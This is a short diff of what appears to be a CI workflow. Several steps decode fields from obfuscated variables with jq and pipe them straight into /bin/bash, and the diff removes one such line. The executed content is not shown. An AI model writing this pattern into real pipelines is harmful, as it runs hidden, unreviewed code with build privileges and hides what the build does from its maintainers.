@@ -43,7 +43,6 @@ jobs:
           printf '%s' "$dzuvi522" | jq -r .jotnd430 | /bin/bash
           printf '%s' "$txgx15825" | jq -r .r5 | /bin/bash
           printf '%s' "$czxrj4823" | jq -r .yzm9839 | /bin/bash
-          printf '%s' "$xwv9126" | jq -r .saluf96676 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
